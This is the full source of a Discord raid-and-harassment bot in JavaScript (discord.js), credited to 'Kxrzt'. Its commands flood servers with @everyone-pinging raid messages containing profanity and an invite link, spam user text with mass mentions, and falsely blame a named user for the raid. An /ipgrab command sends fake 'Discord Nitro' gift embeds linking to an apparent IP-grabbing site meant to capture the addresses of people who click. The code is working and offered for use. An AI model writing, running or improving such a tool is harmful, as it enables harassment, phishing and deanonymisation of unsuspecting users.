import 'dotenv/config';
import { randomUUID } from 'node:crypto';
import {
  Client, GatewayIntentBits, Events, MessageFlags,
  ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder,
} from 'discord.js';

// ---- config ----
const RAID_COUNT_SHORT = 20; // /raid spam count
const RAID_COUNT_LONG  = 20; // /raid2 spam count
const SPAM_COUNT       = 5;  // /spam spam count

const NITRO_ICON = 'https://cdn3.emoji.gg/emojis/7536-nitro.png';
const IPGRAB_LINK = 'https://discord-gg-zjk2bx79e.base44.app';

const RAID_MESSAGE_SHORT = `# @everyone FUCK Y'ALL BITCHES, EASY RAID ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS #`;

// ---- long arabic symbol raid ----
const ARABIC_LINES = 60;            // how many lines
const ARABIC_PER_LINE = 14;         // how many ﷽ per line
const ARABIC_LINE = '# ' + '﷽'.repeat(ARABIC_PER_LINE);

const RAID_MESSAGE_LONG = [
  ...Array(ARABIC_LINES).fill(ARABIC_LINE),
  '||<@everyone|@here>||',
  '-# Raided by Kxrzt',
  '-# Want to raid other servers? Join us.',
  'https://discord.gg/3RhaMXkRnS',
].join('\n');

const RAID_MESSAGES = {
  short: RAID_MESSAGE_SHORT,
  long: RAID_MESSAGE_LONG,
};
// ---------------------------------

const MENTIONS = { parse: ['everyone', 'roles', 'users'] };

// temp storage so the spam button remembers your text
const spamCache = new Map();

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ---------------- /help ----------------
const HELP_EMBED = new EmbedBuilder()
  .setColor(0x5865F2)
  .setTitle('Commands')
  .setDescription('Here is everything this bot can do:')
  .addFields(
    { name: '/raid', value: 'short raid — hit the button to fire the short raid text.' },
    { name: '/raid2', value: 'long arabic symbol raid — hit the button to fire the long ﷽ raid text.' },
    { name: '/spam <message>', value: 'Repeats your message multiple times. You type the text once, hit the button, and it fires.' },
    { name: '/blame <victim>', value: 'Blames someone for the raid and pings them.' },
    { name: '/ipgrab <amount>', value: 'Drops a fake Discord Nitro gift. Pick how many times (1-5) and hit **send**.' },
    { name: '/help', value: 'Shows this list.' },
  )
  .setFooter({ text: 'Made by Kxrzt' });

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once(Events.ClientReady, c => console.log(`Online as ${c.user.tag}`));

client.on(Events.InteractionCreate, async interaction => {
  try {
    // ---------------- /help ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'help') {
      return interaction.reply({ embeds: [HELP_EMBED], flags: MessageFlags.Ephemeral });
    }

    // ---------------- /raid  &  /raid2  -> ask first, button fires it ----------------
    if (interaction.isChatInputCommand() &&
        (interaction.commandName === 'raid' || interaction.commandName === 'raid2')) {

      const variant = interaction.commandName === 'raid2' ? 'long' : 'short';

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`raid:${variant}`)
          .setLabel('raid')
          .setStyle(variant === 'long' ? ButtonStyle.Secondary : ButtonStyle.Primary)
      );

      return interaction.reply({ content: 'start raid?', components: [row], flags: MessageFlags.Ephemeral });
    }

    if (interaction.isButton() && interaction.customId.startsWith('raid:')) {
      const variant = interaction.customId.slice(5);              // 'short' | 'long'
      const message = RAID_MESSAGES[variant] ?? RAID_MESSAGE_SHORT;
      const count   = variant === 'long' ? RAID_COUNT_LONG : RAID_COUNT_SHORT;
      const pause   = variant === 'long' ? 300 : 0;               // long text needs a bit more air

      await interaction.reply({ content: message, allowedMentions: MENTIONS });
      for (let i = 1; i < count; i++) {
        if (pause) await sleep(pause);
        await interaction.followUp({ content: message, allowedMentions: MENTIONS });
      }
      return;
    }

    // ---------------- /spam ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'spam') {
      const text = interaction.options.getString('message');
      const id = randomUUID();
      spamCache.set(id, text);
      setTimeout(() => spamCache.delete(id), 60 * 60 * 1000);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`spam:${id}`).setLabel('spam').setStyle(ButtonStyle.Primary)
      );
      return interaction.reply({ content: 'Spam ur message', components: [row], flags: MessageFlags.Ephemeral });
    }

    if (interaction.isButton() && interaction.customId.startsWith('spam:')) {
      const id = interaction.customId.slice(5);
      const text = spamCache.get(id) ?? '...';
      await interaction.reply({ content: text, allowedMentions: MENTIONS });
      for (let i = 1; i < SPAM_COUNT; i++) {
        await interaction.followUp({ content: text, allowedMentions: MENTIONS });
      }
      return;
    }

    // ---------------- /blame ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'blame') {
      const victim = interaction.options.getUser('victim');
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`blame:${victim.id}`).setLabel('blame').setStyle(ButtonStyle.Danger)
      );
      return interaction.reply({ content: `<@${victim.id}>`, components: [row], flags: MessageFlags.Ephemeral });
    }

    if (interaction.isButton() && interaction.customId.startsWith('blame:')) {
      const victimId = interaction.customId.slice(6);
      await interaction.reply({ content: `<@${victimId}> Your Raid has been succesful!`, allowedMentions: MENTIONS });
      return;
    }

    // ---------------- /ipgrab ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'ipgrab') {
      const amount = interaction.options.getInteger('amount') ?? 1;
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`ipgrab:${amount}`).setLabel('send').setStyle(ButtonStyle.Success)
      );
      return interaction.reply({ content: 'get their ip', components: [row], flags: MessageFlags.Ephemeral });
    }

    if (interaction.isButton() && interaction.customId.startsWith('ipgrab:')) {
      const amount = Number(interaction.customId.slice(7)) || 1;

      const buildEmbed = () => new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('Discord Nitro')
        .setDescription(
          'Someone sent you a gift!\n\n' +
          `[Click here to redeem your Nitro!](${IPGRAB_LINK})\n\n` +
          '**Expires in 48 hours**'
        )
        .setThumbnail(NITRO_ICON);

      await interaction.reply({ embeds: [buildEmbed()] });
      for (let i = 1; i < amount; i++) {
        await interaction.followUp({ embeds: [buildEmbed()] });
      }
      return;
    }
  } catch (err) {
    console.error(err);
  }
});

client.login(process.env.DISCORD_TOKEN);
